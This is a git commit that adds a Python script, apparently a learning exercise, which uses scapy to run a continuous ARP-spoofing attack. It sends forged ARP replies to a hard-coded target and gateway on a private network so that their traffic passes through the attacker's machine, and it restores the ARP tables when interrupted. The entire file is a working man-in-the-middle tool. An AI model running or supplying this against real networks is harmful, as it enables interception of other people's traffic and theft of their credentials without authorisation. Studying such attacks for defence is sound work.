1fafeb2def2b04039ad8db5505692259686b3dd4
Mihai Soare <soaremihai.a@yahoo.com>
2022-11-21 20:21:14 +0200

    first commit

---
+++ main.py
@@ -0,0 +1,43 @@
+import scapy.all as scapy
+import time
+
+TARGET_IP = "10.0.2.15"
+GATEWAY_IP = "10.0.2.1"
+
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    return answered_list[0][1].hwsrc
+
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, count=4, verbose=False)
+
+
+def restore_original_ip(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, verbose=False)
+
+
+sent_packets_count = 0
+try:
+    while True:
+        spoof(TARGET_IP, GATEWAY_IP)
+        spoof(GATEWAY_IP, TARGET_IP)
+        sent_packets_count += 2
+        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n[+] Detecting CTRL+C. Resetting ARP Tables. Please Wait.........\n")
+    restore_original_ip(TARGET_IP, GATEWAY_IP)
+    restore_original_ip(GATEWAY_IP, TARGET_IP)
+
+
+
